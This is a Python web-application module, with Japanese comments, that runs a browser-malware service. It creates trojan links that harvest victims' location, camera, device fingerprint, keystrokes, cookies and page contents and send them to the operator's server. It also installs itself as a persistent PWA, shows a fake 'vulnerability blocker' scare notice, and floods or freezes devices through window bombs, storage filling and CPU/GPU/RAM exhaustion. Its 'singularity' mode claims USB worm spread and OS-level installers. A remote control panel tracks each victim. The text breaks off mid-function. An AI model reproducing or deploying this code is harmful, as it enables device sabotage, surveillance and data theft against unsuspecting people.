"""
app/virus.py — ウイルス兵器モジュール

モード:
  trojan_link    トロイの木馬（リンク型）
  trojan_install トロイの木馬（常駐型）
  max_power      全部盛り（最高威力）
  brick          ブリック（タブが死なない）
  windows        爆音窓爆弾（音＋大量ウィンドウ）／無限窓モード
  storage        容量枯渇
  mix            全部ミックス
  singularity    特異点（全46系統統合・PWA常駐・USBワーム・OS常駐インストーラ・
                 指数増殖する無限窓繁殖・L7固定枠）

設計:
  兵器ページはボタン無し。開いた瞬間から全部自動・無限。
  枚数や発射・停止はこちらの監視室から遠隔操作する（兵器ページがポーリング）。
  singularity はさらに PWA として端末にインストールさせ、常駐・自動起動する。
  相手のUSBにも自分を仕込んで伝染する。
  L7「絶滅」は固定枠。fixed=1 の間は遠隔から下げられない。
  L7では窓が指数増殖し、各窓がヘビースキンで高火力化する。
  L7ではOS常駐インストーラ(.bat/.command/.sh)を配り、ブラウザの外まで侵食する。

監視室:
  /vp/{code}            操作盤（AJAX・ページ遷移なし）
  /api/vp/{code}/state  現在状態
  /api/vp/{code}/stages 個体ごとの進行度＋全体の制圧率
  /api/vp/{code}/rat    個体別RAT/キーログ/DOM
"""
from __future__ import annotations

import os
import re
import io
import json
import base64
import random
import string
import asyncio
import sqlite3
import datetime as dt
from urllib.parse import quote_plus

from fastapi import APIRouter, Request, Depends, Form, HTTPException
from fastapi.responses import (HTMLResponse, RedirectResponse, PlainTextResponse,
                               JSONResponse, Response, StreamingResponse)

from . import tenancy, users, linktrack

router = APIRouter()

MODES = ["trojan_link", "trojan_install", "max_power", "brick",
         "windows", "storage", "mix", "singularity"]
MODE_ALIAS = {"sound": "windows", "sg": "singularity"}   # 旧 sound は爆音窓爆弾へ統合

MODE_LABEL = {
    "trojan_link": "トロイの木馬（リンク型）",
    "trojan_install": "トロイの木馬（常駐型）",
    "max_power": "全部盛り（最高威力）",
    "brick": "ブリック（タブが死なない）",
    "windows": "爆音窓爆弾（音＋大量ウィンドウ）",
    "storage": "容量枯渇",
    "mix": "全部ミックス",
    "singularity": "特異点（SINGULARITY）",
}
MODE_DESC = {
    "trojan_link": "開いた瞬間に全部抜き取って、何事もなかったように本物のサイトへ飛ばす。",
    "trojan_install": "ホーム画面に居座らせて、以後も勝手に起動して送り続ける。",
    "max_power": "位置・カメラ・指紋・電池・回線・容量まで、取れるものを全部。無限に。",
    "brick": "タブを閉じられなくする。画面は消えず、音も鳴り続ける。",
    "windows": "開いた瞬間に大量のウィンドウを出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
    "storage": "開いた瞬間に端末の容量を埋め尽くす。",
    "mix": "上の全部を無限に。最強。",
    "singularity": "全46系統・8資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜7を遠隔変更できる。L7は固定枠で、窓が指数増殖し、各窓がヘビースキンで高火力化し、OS常駐インストーラによりブラウザの外まで侵食する。",
}

# 常駐（ホーム画面追加）で自動発射するモード
AUTO_MODES = ("trojan_install", "mix")

# 1セットの枚数（10 / 100 / 0=無限）
SET_CHOICES = (10, 100, 0)

DEFAULT_NOTIFY = "今すぐ脆弱性ブロッカーをインストールしてウイルス感染を回避してください。"

CAUTION = {
    "trojan_link": "⚠ 開いた瞬間から全部自動・無限。ボタン操作は不要。抜き取ったあとは本物へ飛ぶ（自爆）。",
    "trojan_install": "⚠ ホーム画面に追加＝自爆。以後その端末では勝手に起動し続け、本人が消すまで止まらない。",
    "max_power": "⚠ 開いた瞬間から全部自動・無限。止まらない。ボタン操作は不要。",
    "brick": "⚠ 開いた瞬間から全部自動・無限。タブが死ななくなる。",
    "windows": "⚠ 開いた瞬間に1セット（既定100枚）を10秒以内に出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
    "storage": "⚠ 開いた瞬間に容量を埋め始める。ボタン操作は不要。",
    "mix": "⚠ ホーム画面に追加＝自爆。開いた瞬間から全部が無限に発動する。",
    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。L7「絶滅」は固定枠で、立てたら遠隔から下げられない。iframe自己増殖・GLコンテキスト枯渇・ダウンロード嵐・クリップボード乗っ取りを同時発動し、窓がリミッターなしで倍々に増え続け、OS常駐インストーラを配る。停止・凍結中でもService Worker経由で命令が届く。",
}

SCHEMA = """
CREATE TABLE IF NOT EXISTS virus_links(
  code TEXT PRIMARY KEY, name TEXT, mode TEXT, note TEXT, dest TEXT,
  active INTEGER DEFAULT 1, created TEXT, hits INTEGER DEFAULT 0,
  last_ts TEXT, last_ip TEXT, last_ua TEXT, last_device TEXT,
  winset INTEGER DEFAULT 100, firing INTEGER DEFAULT 1, seq INTEGER DEFAULT 0,
  notify INTEGER DEFAULT 1, notify_text TEXT, notify_mode TEXT,
  level INTEGER DEFAULT 1, fixed INTEGER DEFAULT 0, wipe_seq INTEGER DEFAULT 0,
  freeze TEXT DEFAULT '', bomb TEXT DEFAULT '', inj INTEGER DEFAULT 1, ver TEXT);
CREATE TABLE IF NOT EXISTS virus_hits(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
  device TEXT, os TEXT, browser TEXT, inapp TEXT, country TEXT, city TEXT,
  isp TEXT, vid TEXT, gps_lat REAL, gps_lon REAL, is_bot INTEGER DEFAULT 0);
CREATE INDEX IF NOT EXISTS virus_hits_code ON virus_hits(code, id);
CREATE TABLE IF NOT EXISTS virus_data(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, hit INTEGER, vid TEXT,
  key TEXT, value TEXT, ts TEXT);
CREATE INDEX IF NOT EXISTS virus_data_code ON virus_data(code, hit);
CREATE TABLE IF NOT EXISTS virus_cmd(
  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, sid TEXT, kind TEXT,
  arg TEXT, state INTEGER DEFAULT 0, ts TEXT);
CREATE INDEX IF NOT EXISTS virus_cmd_code ON virus_cmd(code, state);
"""


# ---------------- 基盤 ----------------

def _m():
    from . import main
    return main


def _render(name, request, **ctx):
    return _m().render(name, request, **ctx)


async def _auth(request: Request):
    return await _m().auth(request)


def _now():
    return dt.datetime.now(dt.timezone.utc).isoformat(timespec="seconds")


def _base(request):
    return _m()._base(request).rstrip("/")


def _abs_dest(d):
    d = (d or "").strip()
    if not d:
        return ""
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
        d = "https://" + d
    return d


def _owner(code):
    try:
        o = users.owner_of_link(code)
    except Exception:
        o = None
    if not o:
        return None
    try:
        tenancy.set_current(o)
    except Exception:
        pass
    return o


def _dir(owner):
    d = os.path.join(tenancy.ROOT, tenancy.safe_name(owner), "virus")
    os.makedirs(d, exist_ok=True)
    return d


def _migrate(c):
    try:
        cols = {r["name"] for r in c.execute("PRAGMA table_info(virus_links)").fetchall()}
    except Exception:
        cols = set()
    for name, ddl in (("winset", "INTEGER DEFAULT 100"),
                      ("firing", "INTEGER DEFAULT 1"),
                      ("seq", "INTEGER DEFAULT 0"),
                      ("notify", "INTEGER DEFAULT 1"),
                      ("notify_text", "TEXT"),
                      ("notify_mode", "TEXT"),
                      ("level", "INTEGER DEFAULT 1"),
                      ("fixed", "INTEGER DEFAULT 0"),
                      ("wipe_seq", "INTEGER DEFAULT 0"),
                      ("freeze", "TEXT DEFAULT ''"),
                      ("bomb", "TEXT DEFAULT ''"),
                      ("inj", "INTEGER DEFAULT 1"),
                      ("ver", "TEXT")):
        if name not in cols:
            try:
                c.execute(f"ALTER TABLE virus_links ADD COLUMN {name} {ddl}")
            except Exception:
                pass
    # --- singularity 用: hits に GPS と bot 列を足す ---
    try:
        hcols = {r["name"] for r in c.execute("PRAGMA table_info(virus_hits)").fetchall()}
    except Exception:
        hcols = set()
    for name, ddl in (("gps_lat", "REAL"), ("gps_lon", "REAL"),
                      ("is_bot", "INTEGER DEFAULT 0")):
        if name not in hcols:
            try:
                c.execute(f"ALTER TABLE virus_hits ADD COLUMN {name} {ddl}")
            except Exception:
                pass
    c.commit()


def _db(owner):
    c = sqlite3.connect(os.path.join(_dir(owner), "virus.db"),
                        timeout=15, check_same_thread=False)
    c.row_factory = sqlite3.Row
    try:
        c.execute("PRAGMA journal_mode=WAL")
        c.executescript(SCHEMA)
        _migrate(c)
    except Exception:
        pass
    return c


def _link(c, code):
    return c.execute("SELECT * FROM virus_links WHERE code=?", (code,)).fetchone()


def _val(row, key, default):
    try:
        v = row[key]
        return default if v is None else v
    except Exception:
        return default


def _is_fixed(row):
    try:
        return bool(int(_val(row, "fixed", 0) or 0))
    except Exception:
        return False


def _norm_mode(m):
    m = MODE_ALIAS.get(m or "", m or "")
    return m if m in MODES else "mix"


def _new_code(c, n=8):
    a = string.ascii_lowercase + string.digits
    for _ in range(80):
        code = "".join(random.choice(a) for _ in range(n))
        if not c.execute("SELECT 1 FROM virus_links WHERE code=?", (code,)).fetchone():
            try:
                if not users.owner_of_link(code):
                    return code
            except Exception:
                return code
    return "".join(random.choice(a) for _ in range(n + 4))


def _geo(ip):
    try:
        return linktrack.geo(ip) or {}
    except Exception:
        return {}


def _record_hit(owner, code, request):
    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    p = linktrack.parse_ua(ua)
    g = _geo(ip)
    bot = 0
    try:
        bot = 1 if p.get("is_bot") else 0
    except Exception:
        bot = 0
    if not (ua or "").strip():
        bot = 0                      # UA無しは「不明」であってbotとは限らない
    c = _db(owner)
    cur = c.execute("INSERT INTO virus_hits(code,ts,ip,ua,device,os,browser,inapp,"
                    "country,city,isp,vid,is_bot) VALUES(?,?,?,?,?,?,?,?,?,?,?,'',?)",
                    (code, _now(), ip, ua[:400], p["device"], p["os"], p["browser"],
                     p["inapp"], g.get("country"), g.get("city"), g.get("isp"), bot))
    hid = cur.lastrowid
    c.execute("UPDATE virus_links SET hits=COALESCE(hits,0)+1, last_ts=?, last_ip=?, "
              "last_ua=?, last_device=? WHERE code=?",
              (_now(), ip, ua[:400], (p["device"] or "") + " / " + (p["os"] or ""), code))
    c.commit()
    c.close()
    return hid


# ---------------- 一覧・作成 ----------------

@router.get("/vp", response_class=HTMLResponse)
def list_page(request: Request, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    rows = [dict(r) for r in c.execute(
        "SELECT * FROM virus_links ORDER BY created DESC").fetchall()]
    c.close()
    base = _base(request)
    for r in rows:
        # --- 元の前処理（ここが抜けていた） ---
        r["share"] = base + "/v/" + r["code"]
        r["mode"] = _norm_mode(r.get("mode"))
        r["mode_label"] = MODE_LABEL.get(r["mode"], r["mode"])
        r["caution"] = CAUTION.get(r["mode"], "")
        r["auto"] = (r["mode"] in AUTO_MODES)
        r["level"] = int(r.get("level") or 1)
        r["fixed"] = int(r.get("fixed") or 0)
        r["set_label"] = "∞" if (r.get("winset") == 0) else f'{r.get("winset") or 100}枚/セット'
        r["firing"] = r.get("firing", 1)
        # --- テンプレが使うURLを明示（href空対策・保険） ---
        r["watch"] = base + "/vp/" + r["code"]
        r["weapon"] = base + "/v/" + r["code"]
        r["share_url"] = r["share"]
    return _render("virus_list.html", request, rows=rows, base=base,
                   cautions=CAUTION, sets=SET_CHOICES, default_notify=DEFAULT_NOTIFY,
                   levels=_SG_LEVEL_LABEL,
                   modes=[(m, MODE_LABEL[m], MODE_DESC[m]) for m in MODES])

@router.post("/vp/add")
def create(request: Request, name: str = Form(""), mode: str = Form("mix"),
           dest: str = Form(""), note: str = Form(""), winset: str = Form("100"),
           notify: str = Form("1"), notify_text: str = Form(""),
           notify_mode: str = Form(""), fixed: str = Form("0"), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    code = _new_code(c)
    m = _norm_mode(mode)
    nm = _norm_mode(notify_mode) if notify_mode else ""
    fx = 0 if str(fixed) in ("0", "", "false", "False") else 1
    try:
        ws = int(winset)
    except Exception:
        ws = 100
    ws = ws if ws in SET_CHOICES else 100
    ntext = (notify_text or DEFAULT_NOTIFY)[:300]
    c.execute("INSERT INTO virus_links(code,name,mode,dest,note,active,created,hits,"
              "winset,firing,notify,notify_text,notify_mode,level,fixed,ver) "
              "VALUES(?,?,?,?,?,1,?,0,?,1,?,?,?,?,?,?)",
              (code, (name or "").strip()[:60] or "名無し", m, _abs_dest(dest)[:300],
               (note or "")[:300], _now(), ws, 1 if notify not in ("0", "") else 0,
               ntext, nm, 7 if fx else 1, fx, _SG_VER))
    c.commit()
    c.close()
    try:
        users.register_link(code, u)
    except Exception:
        pass
    return RedirectResponse("/vp/" + code + "?new=1", status_code=303)


# ---------------- 常駐型の付属物 ----------------

@router.get("/v/sw.js")
def sw():
    js = """/* igtracker virus sw */
self.addEventListener("install", function (e) { self.skipWaiting(); });
self.addEventListener("activate", function (e) { e.waitUntil(self.clients.claim()); });
self.addEventListener("fetch", function (e) {
  if (e.request.method !== "GET") return;
  var u = new URL(e.request.url);
  if (u.origin !== location.origin) return;
  if (u.pathname.indexOf("/v/") === 0) return;
});
self.addEventListener("message", function (e) {
  if (e.data && e.data.type === "skip") self.skipWaiting();
});
"""
    return Response(js, media_type="application/javascript",
                    headers={"Service-Worker-Allowed": "/v/"})


@router.get("/v/icon.svg")
def icon():
    svg = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 192">
<rect width="192" height="192" rx="40" fill="#0f1115"/>
<circle cx="96" cy="96" r="26" fill="#4c8dff"/>
<circle cx="96" cy="96" r="52" fill="none" stroke="#4c8dff" stroke-width="6" opacity=".5"/>
<circle cx="96" cy="96" r="74" fill="none" stroke="#7ee08a" stroke-width="4" opacity=".35"/>
</svg>"""
    return Response(svg, media_type="image/svg+xml")


@router.get("/v/{code}/manifest.json")
def manifest(code: str, name: str = "", mode: str = ""):
    """mode を渡すと、インストール後の発射モードを差し替えられる。"""
    start = "/v/" + code + "?i=1"
    if mode:
        start += "&m=" + mode
    man = {
        "name": (name or "igtracker")[:40],
        "short_name": (name or "igtracker")[:12],
        "start_url": start,
        "scope": "/v/",
        "display": "standalone",
        "background_color": "#0f1115",
        "theme_color": "#0f1115",
        "icons": [{"src": "/v/icon.svg", "sizes": "any", "type": "image/svg+xml",
                   "purpose": "any maskable"}],
    }
    return JSONResponse(man)


# ---------------- 状態（兵器ページがポーリング） ----------------

@router.get("/v/{code}/st")
def status(code: str):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row:
        return {"ok": 0}
    return {"ok": 1,
            "set": _val(row, "winset", 100),
            "firing": _val(row, "firing", 1),
            "seq": _val(row, "seq", 0)}


# ---------------- 兵器ページ ----------------

@router.get("/v/{code}", response_class=HTMLResponse)
def land(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("リンクが無効です", status_code=404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)

    # ?m= でモード上書き（インストール後の起動用）
    mode = _norm_mode(request.query_params.get("m") or row["mode"])

    if mode == "singularity":
        return _sg_land(code, request)

    hid = _record_hit(owner, code, request)
    child = request.query_params.get("w") == "1"
    installed = request.query_params.get("i") == "1"

    notify_mode = _val(row, "notify_mode", "") or ""
    notify_mode = _norm_mode(notify_mode) if notify_mode else ""
    notify = int(_val(row, "notify", 1))
    notify_text = _val(row, "notify_text", "") or DEFAULT_NOTIFY
    # インストールさせる対象（通知のボタンが入れる兵器）
    install_mode = notify_mode or (mode if mode in ("trojan_install", "mix") else "")

    return _render(
        "virus.html", request,
        code=code, link=dict(row), hit=hid, base=_base(request),
        mode=mode, mode_label=MODE_LABEL.get(mode, mode),
        caution=CAUTION.get(mode, ""),
        dest=_abs_dest(row["dest"]), is_child=child, is_installed=installed,
        winset=_val(row, "winset", 100), firing=_val(row, "firing", 1),
        notify=notify, notify_text=notify_text, install_mode=install_mode,
        child_text=random.choice([
            "システム警告", "メモリ不足", "ディスク容量が危険です", "異常を検出しました",
            "バックグラウンドで動作中", "最適化が必要です", "ウイルスを検出しました",
            "このウィンドウは閉じないでください",
        ]),
    )


@router.post("/v/{code}/d")
async def data(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    hid = body.get("hit") or 0
    vid = str(body.get("vid") or "")[:64]
    c = _db(owner)
    ts = _now()
    n = 0
    for k, v in list(body.items())[:200]:
        if k in ("hit", "vid"):
            continue
        if isinstance(v, (dict, list)):
            v = json.dumps(v, ensure_ascii=False)
        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
                  (code, int(hid or 0), vid, str(k)[:60], str(v)[:20000], ts))
        n += 1
    if vid:
        c.execute("UPDATE virus_hits SET vid=? WHERE id=?", (vid, int(hid or 0)))
    c.execute("UPDATE virus_links SET last_ts=? WHERE code=?", (ts, code))
    c.commit()
    c.close()
    return {"ok": 1, "n": n, "server": ts}


# ---------------- 監視室（こちらの操作盤） ----------------

@router.get("/vp/{code}", response_class=HTMLResponse)
def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    hits = [dict(r) for r in c.execute(
        "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
    dat = [dict(r) for r in c.execute(
        "SELECT * FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 3000", (code,)).fetchall()]
    c.close()
    base = _base(request)
    by_hit = {}
    for d in dat:
        by_hit.setdefault(d["hit"], []).append(d)
    mode = _norm_mode(row["mode"])
    notify_mode = _val(row, "notify_mode", "") or ""
    notify_mode = _norm_mode(notify_mode) if notify_mode else ""
    lv = 7 if _is_fixed(row) else int(_val(row, "level", 1) or 0)
    sids = []
    for h in hits:
        if h.get("vid") and h["vid"] not in sids:
            sids.append(h["vid"])
    stages, stat = _sg_stages_for(hits, by_hit)          # ← 進行度＋集計
    return _render("virus_watch.html", request, code=code, link=dict(row),
                   hits=hits, by_hit=by_hit, base=base, is_new=(new == "1"),
                   stages=stages, stat=stat, sids=sids,
                   level_labels=_SG_LEVEL_LABEL, level_descs=_SG_LEVEL_DESC,   # ← 追加
                   mode_label=MODE_LABEL.get(mode, mode),
                   mode_desc=MODE_DESC.get(mode, ""),
                   caution=CAUTION.get(mode, ""),
                   auto=(mode in AUTO_MODES),
                   sets=SET_CHOICES, default_notify=DEFAULT_NOTIFY,
                   notify=int(_val(row, "notify", 1)),
                   notify_text=_val(row, "notify_text", "") or DEFAULT_NOTIFY,
                   notify_mode=notify_mode,
                   winset=_val(row, "winset", 100),
                   firing=_val(row, "firing", 1),
                   share=base + "/v/" + code, total=len(hits),
                   is_sg=(mode == "singularity"),
                   level=lv, level_label=_SG_LEVEL_LABEL.get(lv, ""),
                   level_desc=_SG_LEVEL_DESC.get(lv, ""),
                   levels=sorted(_SG_LEVEL_LABEL.keys()),
                   fixed=1 if _is_fixed(row) else 0,
                   freeze=_val(row, "freeze", "") or "",
                   wipe_seq=int(_val(row, "wipe_seq", 0) or 0),
                   install_level=_SG_INSTALL_LEVEL,
                   bomb=_val(row, "bomb", "") or "",
                   inj=int(_val(row, "inj", 1) or 0),
                   defeat_at=SG_DEFEAT_AT,
                   stage_labels=SG_STAGE_LABEL, stage_colors=SG_STAGE_COLOR,
                   modes=[(m, MODE_LABEL[m]) for m in MODES])


@router.post("/vp/{code}/fire")
def fire(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET firing=1, seq=COALESCE(seq,0)+1 WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?fired=1", status_code=303)


@router.post("/vp/{code}/stop")
def stop(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET firing=0 WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/resume")
def resume(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET firing=1 WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/set")
def set_size(code: str, winset: str = Form("100"), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    try:
        ws = int(winset)
    except Exception:
        ws = 100
    ws = ws if ws in SET_CHOICES else 100
    c = _db(owner)
    c.execute("UPDATE virus_links SET winset=? WHERE code=?", (ws, code))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.get("/api/vp/{code}")
def api(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    hits = [dict(r) for r in c.execute(
        "SELECT * FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300", (code,)).fetchall()]
    c.close()
    return {"hits": hits, "count": len(hits), "server": _now(),
            "set": _val(row, "winset", 100), "firing": _val(row, "firing", 1),
            "level": 7 if _is_fixed(row) else int(_val(row, "level", 1) or 0),
            "fixed": 1 if _is_fixed(row) else 0}


@router.get("/api/vp/{code}/rat")
def api_rat(code: str, sid: str = "", u=Depends(_auth)):
    """個体（sid）のRAT・キーログ・DOM・Cookie・API呼び出しをまとめて返す。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    hid = 0
    if sid:
        r = c.execute("SELECT id FROM virus_hits WHERE code=? AND vid=? ORDER BY id DESC LIMIT 1",
                      (code, sid)).fetchone()
        hid = r["id"] if r else 0
    if not hid:
        r = c.execute("SELECT id FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 1",
                      (code,)).fetchone()
        hid = r["id"] if r else 0
    rows = [dict(r) for r in c.execute(
        "SELECT key,value,ts FROM virus_data WHERE code=? AND hit=? ORDER BY id DESC LIMIT 400",
        (code, hid)).fetchall()]
    c.close()
    out = {}
    for r in rows:
        if r["key"] not in out:
            out[r["key"]] = {"v": r["value"], "ts": r["ts"]}
    return {"ok": 1, "hit": hid, "sid": sid, "data": out}


@router.post("/vp/{code}/update")
def update(request: Request, code: str, name: str = Form(""), mode: str = Form(""),
           dest: str = Form(""), note: str = Form(""), active: str = Form("1"),
           notify: str = Form("1"), notify_text: str = Form(""),
           notify_mode: str = Form(""), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    if not _link(c, code):
        c.close()
        raise HTTPException(404)
    f = {}
    if name:
        f["name"] = name.strip()[:60]
    if mode:
        f["mode"] = _norm_mode(mode)
    f["dest"] = _abs_dest(dest)[:300]
    f["note"] = (note or "")[:300]
    f["active"] = 1 if active not in ("0", "") else 0
    f["notify"] = 1 if notify not in ("0", "") else 0
    f["notify_text"] = (notify_text or DEFAULT_NOTIFY)[:300]
    f["notify_mode"] = _norm_mode(notify_mode) if notify_mode else ""
    v = list(f.values()) + [code]
    c.execute("UPDATE virus_links SET " + ", ".join(f"{k}=?" for k in f) + " WHERE code=?", v)
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/clear")
def clear(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM virus_hits WHERE code=?", (code,))
    c.execute("DELETE FROM virus_data WHERE code=?", (code,))
    try:
        c.execute("DELETE FROM virus_cmd WHERE code=?", (code,))
    except Exception:
        pass
    c.execute("UPDATE virus_links SET hits=0, last_ts=NULL, last_ip=NULL, last_ua=NULL,"
              "last_device=NULL WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/delete")
def delete(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    for t in ("virus_hits", "virus_data", "virus_cmd"):
        try:
            c.execute(f"DELETE FROM {t} WHERE code=?", (code,))
        except Exception:
            pass
    c.execute("DELETE FROM virus_links WHERE code=?", (code,))
    c.commit()
    c.close()
    try:
        users.unlink_owner(code)
    except Exception:
        pass
    return RedirectResponse("/vp", status_code=303)


# ===========================================================================
# SINGULARITY v3 統合
# ===========================================================================
from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
                          WORKER_JS as _SG_WORKER, SHARED_JS as _SG_SHARED,
                          INSTALL_BAT as _SG_BAT, INSTALL_COMMAND as _SG_CMD,
                          INSTALL_SH as _SG_SH, build_installer as _sg_installer,
                          VIRUS as SINGULARITY,
                          new_sid as _sg_sid, LEVEL_LABEL as _SG_LEVEL_LABEL,
                          LEVEL_DESC as _SG_LEVEL_DESC,
                          APP_NAME_DEFAULT as _SG_APP_NAME)

MODE_LABEL["singularity"] = "特異点（SINGULARITY）"
_GIF1 = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
_SG_INSTALL_LEVEL = int(os.getenv("SG_INSTALL_LEVEL", "4"))
_SG_VER = os.getenv("SG_APP_VER", "3.4")
_SG_INJ = os.getenv("SG_INJ", "1") != "0"
_SG_RAT = os.getenv("SG_RAT", "1") != "0"
_SG_SSE = os.getenv("SG_SSE", "1") != "0"
_SG_FINAL_RAM_MB = int(os.getenv("SG_FINAL_RAM_MB", "0") or 0)
_SG_GPU_MEM = os.getenv("SG_GPU_MEM", "1") != "0"
_SG_BURN_MAX = int(os.getenv("SG_BURN_MAX", "32") or 32)
_SG_WIN_MODE = os.getenv("SG_WIN_MODE", "")
_SG_WIN_BRANCH = os.getenv("SG_WIN_BRANCH", "")
_SG_WIN_DEPTH = os.getenv("SG_WIN_DEPTH", "")

try:
    from PIL import Image, ImageDraw           # noqa
    _SG_PIL = True
except Exception:
    _SG_PIL = False

_SG_ICONS = {}


def _lv(v) -> int:
    """レベルは 0〜7 の8段階。7は固定枠。"""
    try:
        return max(0, min(7, int(v)))
    except Exception:
        return 1


def _sg_win_lock():
    """環境変数で窓の増殖を固定したいときのロック。未設定なら None（レベル準拠）。"""
    if not _SG_WIN_MODE:
        return None
    out = {"mode": _SG_WIN_MODE if _SG_WIN_MODE in ("off", "chain", "breed") else ""}
    if _SG_WIN_BRANCH.isdigit():
        out["branch"] = max(1, min(8, int(_SG_WIN_BRANCH)))
    if _SG_WIN_DEPTH.isdigit():
        out["depth"] = max(0, int(_SG_WIN_DEPTH))
    return out


def _sg_icon(size, maskable=False):
    """PWA 用アイコンを Pillow で生成（無ければ空を返し SVG にフォールバック）。"""
    key = (size, bool(maskable))
    if key in _SG_ICONS:
        return _SG_ICONS[key]
    data = b""
    if _SG_PIL:
        try:
            img = Image.new("RGB", (size, size), (5, 7, 10))
            d = ImageDraw.Draw(img)
            c = size / 2.0
            pad = size * (0.30 if maskable else 0.22)
            r1 = c - pad
            r2 = r1 * 0.62
            r3 = r1 * 0.27
            d.ellipse([c - r1, c - r1, c + r1, c + r1],
                      outline=(0, 255, 136), width=max(2, int(size * 0.022)))
            d.ellipse([c - r2, c - r2, c + r2, c + r2],
                      outline=(76, 141, 255), width=max(2, int(size * 0.018)))
            d.ellipse([c - r3, c - r3, c + r3, c + r3], fill=(0, 255, 136))
            r0 = max(2, int(size * 0.045))
            d.ellipse([c - r0, c - r0, c + r0, c + r0], fill=(235, 255, 246))
            buf = io.BytesIO()
            img.save(buf, format="PNG", optimize=True)
            data = buf.getvalue()
        except Exception:
            data = b""
    _SG_ICONS[key] = data
    return data


_SG_ICON_SVG = (
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">'
    '<rect width="512" height="512" rx="110" fill="#05070a"/>'
    '<circle cx="256" cy="256" r="170" fill="none" stroke="#00ff88" stroke-width="14"/>'
    '<circle cx="256" cy="256" r="104" fill="none" stroke="#4c8dff" stroke-width="12"/>'
    '<circle cx="256" cy="256" r="46" fill="#00ff88"/>'
    '<circle cx="256" cy="256" r="12" fill="#ebfff6"/></svg>'
)


def _sg_flat(prefix, obj, out, depth=0):
    """singularity の巨大JSONを key/value に平坦化する。"""
    if depth > 7 or len(out) > 400:
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            _sg_flat(f"{prefix}.{k}" if prefix else str(k), v, out, depth + 1)
    elif isinstance(obj, list):
        if obj and not any(isinstance(x, (dict, list)) for x in obj):
            out[prefix] = json.dumps(obj, ensure_ascii=False)
        else:
            for i, v in enumerate(obj[:40]):
                _sg_flat(f"{prefix}[{i}]", v, out, depth + 1)
    elif obj is None:
        return
    else:
        out[prefix] = obj


def _sg_ingest(owner, code, report, sid):
    """singularity の報告を virus_data に取り込む（差分のみ・監視室にそのまま出る）。"""
    sid = str(sid or report.get("sid") or "")[:64]
    c = _db(owner)
    hid = 0
    if sid:
        r = c.execute("SELECT id FROM virus_hits WHERE code=? AND vid=? "
                      "ORDER BY id DESC LIMIT 1", (code, sid)).fetchone()
        hid = r["id"] if r else 0
    if not hid:
        r = c.execute("SELECT id FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 1",
                      (code,)).fetchone()
        hid = r["id"] if r else 0

    items = {}
    _sg_flat("", report, items)
    snap = (report.get("media") or {}).get("snapshot") or ""
    items.pop("media.snapshot", None)

    have = {}
    for r in c.execute("SELECT key,value FROM virus_data WHERE code=? AND hit=?",
